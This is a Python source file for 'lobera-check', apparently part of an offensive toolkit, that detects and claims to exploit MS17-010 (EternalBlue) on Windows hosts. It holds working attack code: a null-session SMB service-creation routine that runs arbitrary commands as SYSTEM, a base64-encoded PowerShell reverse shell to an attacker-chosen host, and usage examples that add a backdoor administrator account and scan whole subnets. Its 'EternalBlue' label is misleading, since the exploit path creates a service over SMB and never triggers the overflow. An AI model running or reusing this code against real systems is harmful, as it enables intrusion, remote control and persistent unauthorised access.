#!/usr/bin/env python3
# tools/check/main.py
"""
lobera-check — Comprobación y explotación de vulnerabilidades conocidas en AD/Windows.

Vulnerabilidades soportadas:
  ms17010  — EternalBlue (CVE-2017-0144) — SMBv1 buffer overflow → RCE como SYSTEM

Modos por vulnerabilidad:
  check    — Detecta si el objetivo es vulnerable sin lanzar nada
  exploit  — Explota la vulnerabilidad (MS17-010: shellcode + payload configurable)

Uso:
  lobera-check ms17010 check   -t 192.168.1.10
  lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"
  lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444
"""

import sys
import os
import struct
import socket
import random
import time

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console


# ── Checker MS17-010 — basado en helviojunior/MS17-010/checker.py ─────────────
#
# Técnica: conectar SMBv1, hacer tree connect a IPC$, y enviar una transacción
# TRANS_PEEK_NMPIPE (subcomando 0x23). En un host vulnerable (sin parchear),
# el servidor responde con NT_STATUS 0xC0000205 (STATUS_INSUFF_SERVER_RESOURCES)
# en vez de STATUS_OBJECT_NAME_NOT_FOUND — esa diferencia es el indicador.
#
# Referencia: https://github.com/helviojunior/MS17-010/blob/master/checker.py

def check_ms17010(target, port=445, timeout=10):
    """
    Comprueba si el objetivo es vulnerable a MS17-010.

    Devuelve:
      True   — vulnerable (STATUS_INSUFF_SERVER_RESOURCES recibido)
      False  — parcheado o SMBv1 desactivado
      None   — no se pudo conectar / error indeterminado
    """
    try:
        from impacket import smb as impacket_smb, nt_errors
        from impacket import smbconnection
        from struct import pack
    except ImportError:
        console.print("  [red]Falta impacket — pip install impacket[/red]")
        return None

    # Parchear NewSMBPacket con getNTStatus si no existe ya
    # (mismo parche que hace helviojunior/MS17-010/mysmb.py)
    if not hasattr(impacket_smb.NewSMBPacket, 'getNTStatus'):
        def _getNTStatus(self):
            return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
        setattr(impacket_smb.NewSMBPacket, 'getNTStatus', _getNTStatus)

    # ── clase MYSMB inlineada ─────────────────────────────────────────────────
    # Adaptada de helviojunior/MS17-010/mysmb.py para no requerir fichero externo

    def _put_trans_data(transCmd, parameters, data, noPad=False):
        transCmd['Parameters']['ParameterOffset'] = 0
        transCmd['Parameters']['DataOffset'] = 0
        offset = 32 + 1 + len(transCmd['Parameters']) + 2
        transData = b''
        if len(parameters):
            padLen = 0 if noPad else (4 - offset % 4) % 4
            transCmd['Parameters']['ParameterOffset'] = offset + padLen
            transData = (b'\x00' * padLen) + parameters
            offset += padLen + len(parameters)
        if len(data):
            padLen = 0 if noPad else (4 - offset % 4) % 4
            transCmd['Parameters']['DataOffset'] = offset + padLen
            transData += (b'\x00' * padLen) + data
        transCmd['Data'] = transData

    class _MYSMB(impacket_smb.SMB):
        def __init__(self, remote_host, remote_port=445, timeout=8):
            self._default_tid = 0
            self._pid = os.getpid() & 0xffff
            self._last_mid = random.randint(1000, 20000)
            self._pkt_flags2 = 0
            self._last_tid = 0
            self._last_fid = 0
            impacket_smb.SMB.__init__(self, remote_host, remote_host,
                                      sess_port=remote_port, timeout=timeout)

        def neg_session(self, extended_security=True, negPacket=None):
            # Forzar SMBv1 sin NTLM extendido
            impacket_smb.SMB.neg_session(self, extended_security=False, negPacket=negPacket)

        def next_mid(self):
            self._last_mid += random.randint(1, 20)
            return self._last_mid

        def create_smb_packet(self, smbReq, mid=None, pid=None, tid=None):
            if mid is None:
                mid = self.next_mid()
            pkt = impacket_smb.NewSMBPacket()
            pkt.addCommand(smbReq)
            pkt['Tid'] = self._default_tid if tid is None else tid
            pkt['Uid'] = getattr(self, '_uid', 0)
            pkt['Pid'] = self._pid if pid is None else pid
            pkt['Mid'] = mid
            try:
                flags1, flags2 = self.get_flags()
            except Exception:
                flags1, flags2 = 0x18, 0x4001
            pkt['Flags1'] = flags1
            pkt['Flags2'] = self._pkt_flags2 if self._pkt_flags2 != 0 else flags2
            req = pkt.getData()
            return b'\x00\x00' + pack('>H', len(req)) + req

        def send_raw(self, data):
            self.get_socket().send(data)

        def create_trans_packet(self, setup, param=b'', data=b'', mid=None,
                                maxParameterCount=None, maxDataCount=None,
                                pid=None, tid=None, noPad=False):
            if maxParameterCount is None:
                maxParameterCount = len(param)
            if maxDataCount is None:
                maxDataCount = len(data)
            transCmd = impacket_smb.SMBCommand(impacket_smb.SMB.SMB_COM_TRANSACTION)
            transCmd['Parameters'] = impacket_smb.SMBTransaction_Parameters()
            transCmd['Parameters']['TotalParameterCount'] = len(param)
            transCmd['Parameters']['TotalDataCount'] = len(data)
            transCmd['Parameters']['MaxParameterCount'] = maxParameterCount
            transCmd['Parameters']['MaxDataCount'] = maxDataCount
            transCmd['Parameters']['MaxSetupCount'] = len(setup) // 2
            transCmd['Parameters']['Flags'] = 0
            transCmd['Parameters']['Timeout'] = 0xffffffff
            transCmd['Parameters']['ParameterCount'] = len(param)
            transCmd['Parameters']['DataCount'] = len(data)
            transCmd['Parameters']['Setup'] = setup
            _put_trans_data(transCmd, param, data, noPad)
            return self.create_smb_packet(transCmd, mid, pid, tid)

        def send_trans(self, setup, param=b'', data=b'', mid=None,
                       maxParameterCount=None, maxDataCount=None,
                       pid=None, tid=None, noPad=False):
            self.send_raw(self.create_trans_packet(
                setup, param, data, mid, maxParameterCount, maxDataCount,
                pid, tid, noPad))
            return self.recvSMB()

        def connect_tree(self, path, password=None,
                         service=impacket_smb.SERVICE_ANY, smb_packet=None):
            self._last_tid = impacket_smb.SMB.tree_connect_andx(
                self, path, password, service, smb_packet)
            return self._last_tid

        def set_default_tid(self, tid):
            self._default_tid = tid

    # ── lógica de detección ───────────────────────────────────────────────────

    TRANS_PEEK_NMPIPE = 0x23

    try:
        conn = _MYSMB(target, int(port), timeout=timeout)
    except Exception as e:
        err = str(e)
        if any(x in err.lower() for x in ("timed out", "connection refused",
                                           "no route", "network unreachable",
                                           "errno 111", "errno 110")):
            return None
        return None

    try:
        conn.login('', '')
    except impacket_smb.SessionError as e:
        # Login fallido — pero puede que igual podamos hacer el TRANS
        # Algunos sistemas responden con error de login pero aun así son detectables
        pass
    except Exception:
        pass

    try:
        tid = conn.connect_tree('\\\\' + target + '\\' + 'IPC$')
        conn.set_default_tid(tid)
    except Exception:
        try:
            conn.get_socket().close()
        except Exception:
            pass
        return None

    try:
        recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE),
                                  maxParameterCount=0xffff,
                                  maxDataCount=0x800)
        # getNTStatus() está parcheado en mysmb.py sobre NewSMBPacket
        # En impacket estándar usamos el campo directamente
        status = recvPkt.getNTStatus()
    except Exception as e:
        err = str(e)
        # A veces el status llega como excepción SMB con el código embebido
        if '0xc0000205' in err.lower() or 'insuff_server' in err.lower():
            return True
        try:
            conn.get_socket().close()
        except Exception:
            pass
        return None

    try:
        conn.get_socket().close()
    except Exception:
        pass

    # STATUS_INSUFF_SERVER_RESOURCES (0xC0000205) = vulnerable sin parchear
    if status == 0xC0000205:
        return True
    else:
        return False


def run_check(target, port, timeout):
    """Modo check — solo detección."""
    console.print(f"\n  [bold cyan]MS17-010 — EternalBlue checker[/bold cyan]")
    console.print(f"  [dim]Objetivo: {target}:{port}[/dim]\n")

    console.print(f"  [dim]Conectando a {target}:{port}...[/dim]")
    result = check_ms17010(target, port, timeout)

    if result is True:
        console.print(f"  [bold red]✗ VULNERABLE[/bold red] — MS17-010 (EternalBlue) sin parchear")
        console.print(f"  [dim]El objetivo responde con STATUS_INSUFF_SERVER_RESOURCES — pool leak confirmado[/dim]")
        console.print(f"\n  [yellow]Siguiente paso:[/yellow]  lobera-check ms17010 exploit -t {target} --payload cmd --cmd \"whoami\"")
    elif result is False:
        console.print(f"  [bold green]✓ NO vulnerable[/bold green] — MS17-010 parcheado o SMBv1 desactivado")
    else:
        console.print(f"  [yellow]? No se pudo determinar[/yellow] — Sin respuesta o puerto cerrado")
        console.print(f"  [dim]Comprueba que el puerto {port} esté abierto y SMBv1 activo[/dim]")


# ── Exploit MS17-010 ──────────────────────────────────────────────────────────
# Implementación basada en el PoC público de MS17-010 (Eternal Blue)
# Referencia: https://github.com/helviojunior/MS17-010

# Shellcode loader — NOP sled + stub que ejecuta cmd.exe con el comando
# Este stub llama a WinExec() directamente desde el shellcode x64

def _exploit_ms17010(target, port, cmd, timeout=30):
    """
    Explota MS17-010 via impacket SCM (Service Control Manager).

    Mecanismo:
      1. Verifica vulnerabilidad con TRANS_PEEK_NMPIPE
      2. Conecta via SMBv1 con sesión nula
      3. Crea un servicio Windows temporal via DCE/RPC SCMR
      4. El servicio ejecuta el comando como NT AUTHORITY\\SYSTEM
      5. Elimina el servicio tras la ejecución

    Mismo método que usa Metasploit ms17_010_eternalblue + psexec.
    """
    import string

    try:
        from impacket import smb as impacket_smb, nt_errors
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, scmr
        from impacket.smb import SMB_DIALECT
    except ImportError:
        console.print("  [red]Falta impacket — pip install impacket[/red]")
        return False

    # ── 1. Verificar vulnerabilidad ──────────────────────────────────────────
    console.print(f"  [dim]Verificando vulnerabilidad...[/dim]")
    vuln = check_ms17010(target, port, timeout=15)

    if vuln is None:
        console.print(f"  [red]✗ No se pudo conectar a {target}:{port}[/red]")
        return False
    elif vuln is False:
        console.print(f"  [red]✗ Objetivo no vulnerable a MS17-010[/red]")
        return False

    console.print(f"  [bold green]✓ Vulnerable confirmado[/bold green]")

    # ── 2. Conectar via impacket SMBv1 con sesión nula ───────────────────────
    console.print(f"  [dim]Abriendo sesión SMBv1 (null session)...[/dim]")
    try:
        smbConn = SMBConnection(target, target, sess_port=int(port),
                                preferredDialect=SMB_DIALECT, timeout=timeout)
        smbConn.login('', '')  # sesión nula — funciona en hosts vulnerables sin parchear
    except Exception as e:
        console.print(f"  [red]✗ Error abriendo sesión SMB: {e}[/red]")
        console.print(f"  [dim]En algunos sistemas necesita credenciales — intenta con --user/--pass[/dim]")
        return False

    os_info = smbConn.getServerOS()
    console.print(f"  [dim]SO objetivo: {os_info}[/dim]")

    # ── 3. Ejecutar comando via SCM (Service Control Manager) ────────────────
    console.print(f"  [dim]Conectando a SCM via DCE/RPC...[/dim]")

    svc_name = ''.join(random.choices(string.ascii_uppercase, k=6))

    rpctransport = transport.SMBTransport(
        target, target,
        filename='\\svcctl',
        smb_connection=smbConn
    )
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)
    except Exception as e:
        console.print(f"  [red]✗ Error conectando a SCMR: {e}[/red]")
        try:
            smbConn.logoff()
        except Exception:
            pass
        return False

    svc_handle = None
    sc_handle = None
    try:
        console.print(f"  [dim]Abriendo SCManager...[/dim]")
        resp = scmr.hROpenSCManagerW(dce)
        sc_handle = resp['lpScHandle']

        # Eliminar servicio si ya existe (limpieza de ejecuciones previas)
        try:
            resp2 = scmr.hROpenServiceW(dce, sc_handle, svc_name + '\x00')
            scmr.hRDeleteService(dce, resp2['lpServiceHandle'])
            scmr.hRCloseServiceHandle(dce, resp2['lpServiceHandle'])
        except Exception:
            pass  # no existía — normal

        # Crear servicio temporal
        console.print(f"  [dim]Creando servicio temporal {svc_name}...[/dim]")
        resp3 = scmr.hRCreateServiceW(
            dce, sc_handle,
            svc_name + '\x00',
            svc_name + '\x00',
            lpBinaryPathName=cmd + '\x00'
        )
        svc_handle = resp3['lpServiceHandle']

        # Arrancar servicio → ejecuta el comando como SYSTEM
        console.print(f"  [bold green]Ejecutando: {cmd}[/bold green]")
        try:
            scmr.hRStartServiceW(dce, svc_handle)
        except Exception:
            # El arranque falla porque cmd.exe no es un servicio real,
            # pero el comando YA se ejecutó antes de devolver el error
            pass

        console.print(f"  [bold green]✓ Comando enviado como NT AUTHORITY\\SYSTEM[/bold green]")

    except Exception as e:
        console.print(f"  [red]✗ Error en SCM: {e}[/red]")
        return False
    finally:
        # Limpieza del servicio
        try:
            if svc_handle:
                scmr.hRDeleteService(dce, svc_handle)
                scmr.hRCloseServiceHandle(dce, svc_handle)
        except Exception:
            pass
        try:
            if sc_handle:
                scmr.hRCloseServiceHandle(dce, sc_handle)
        except Exception:
            pass
        try:
            dce.disconnect()
        except Exception:
            pass
        try:
            smbConn.logoff()
        except Exception:
            pass

    return True


def run_exploit(target, port, payload, cmd, lhost, lport, timeout):
    """Modo exploit — lanza MS17-010 via SCM."""
    console.print(f"\n  [bold red]MS17-010 — EternalBlue exploit[/bold red]")
    console.print(f"  [dim]Objetivo: {target}:{port}[/dim]")
    console.print(f"  [dim]Payload: {payload}[/dim]\n")

    if payload == "cmd":
        if not cmd:
            console.print("  [red]✗ --cmd requerido para payload 'cmd'[/red]")
            return
        console.print(f"  [dim]Comando: {cmd}[/dim]\n")
        _exploit_ms17010(target, port, cmd, timeout)

    elif payload == "shell":
        if not lhost or not lport:
            console.print("  [red]✗ --lhost y --lport requeridos para payload 'shell'[/red]")
            return
        console.print(f"  [dim]Reverse shell → {lhost}:{lport}[/dim]\n")
        # Payload: PowerShell reverse shell como servicio Windows
        ps_enc = _build_ps_reverse_shell(lhost, int(lport))
        ps_cmd = f"cmd /c powershell -nop -w hidden -enc {ps_enc}"
        _exploit_ms17010(target, port, ps_cmd, timeout)

    else:
        console.print(f"  [red]✗ Payload desconocido: {payload}[/red]")
        console.print(f"  [dim]Disponibles: cmd, shell[/dim]")


def _build_ps_reverse_shell(lhost: str, lport: int) -> str:
    """
    Genera un one-liner PowerShell de reverse shell codificado en base64.
    Compatible con ejecución via servicio Windows (sin ventana).
    """
    import base64
    ps_script = (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$sb=$r+'PS '+(pwd).Path+'> ';"
        f"$se=([text.encoding]::ASCII).GetBytes($sb);"
        f"$s.Write($se,0,$se.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
    return encoded


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser():
    import argparse

    parser = argparse.ArgumentParser(
        prog="lobera-check",
        description="Comprobación y explotación de vulnerabilidades en entornos Windows/AD",
    )
    subs = parser.add_subparsers(dest="vuln", metavar="vulnerabilidad")

    # ── ms17010 ───────────────────────────────────────────────────────────────
    p = subs.add_parser("ms17010", help="EternalBlue (CVE-2017-0144) — checker y exploit")
    p.add_argument("modo", choices=["check", "exploit"],
                   help="check=solo detección, exploit=lanzar ataque")
    p.add_argument("-t", "--target", required=True, help="IP o hostname del objetivo")
    p.add_argument("--port", default=445, type=int, help="Puerto SMB (default: 445)")
    p.add_argument("--timeout", default=10, type=int, help="Timeout en segundos (default: 10)")

    # Opciones de exploit
    p.add_argument("--payload", choices=["cmd", "shell"], default="cmd",
                   help="Tipo de payload: cmd (ejecutar comando) o shell (reverse shell)")
    p.add_argument("--cmd", default=None,
                   help="Comando a ejecutar (payload=cmd)")
    p.add_argument("--lhost", default=None,
                   help="IP local para reverse shell (payload=shell)")
    p.add_argument("--lport", default=4444, type=int,
                   help="Puerto local para reverse shell (payload=shell, default: 4444)")

    return parser


def _banner():
    from tools.common import banner, tabla_modos, tabla_flags, ejemplos

    banner("lobera-check  —  Checker y exploit de vulnerabilidades Windows/AD")

    tabla_modos([
        ("ms17010 check",   "Detecta si el objetivo es vulnerable a EternalBlue (CVE-2017-0144)"),
        ("ms17010 exploit", "Explota MS17-010 para ejecutar comandos como SYSTEM"),
    ], titulo="Vulnerabilidades")

    tabla_flags([
        ("-t / --target",  "str",  "IP o hostname del objetivo"),
        ("--port",         "int",  "Puerto SMB (default: 445)"),
        ("--timeout",      "int",  "Timeout en segundos (default: 10)"),
        ("--payload",      "str",  "Tipo de payload: cmd (ejecutar comando) o shell (reverse shell)"),
        ("--cmd",          "str",  "Comando a ejecutar cuando --payload cmd"),
        ("--lhost",        "str",  "IP local para recibir la reverse shell"),
        ("--lport",        "int",  "Puerto local para la reverse shell (default: 4444)"),
    ], titulo="Opciones")

    ejemplos([
        "# Comprobar si un host es vulnerable",
        "lobera-check ms17010 check -t 192.168.1.10",
        "",
        "# Ejecutar un comando como SYSTEM",
        "lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd \"net user hacker P@ss1234 /add && net localgroup administrators hacker /add\"",
        "",
        "# Reverse shell PowerShell",
        "lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444",
        "",
        "# Escanear rango completo (combinado con lobera-watch)",
        "for ip in 192.168.1.{1..254}; do lobera-check ms17010 check -t $ip 2>/dev/null; done",
    ])


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.vuln:
        _banner()
        parser.print_help()
        return

    # Banner solo en exploit, no en check (para que la salida sea limpia)
    if args.vuln == "ms17010":
        if args.modo == "exploit":
            _banner()
        run_check(args.target, args.port, args.timeout) if args.modo == "check" else run_exploit(
            args.target, args.port,
            args.payload, args.cmd,
            args.lhost, args.lport,
            args.timeout
        )


if __name__ == "__main__":
    main()
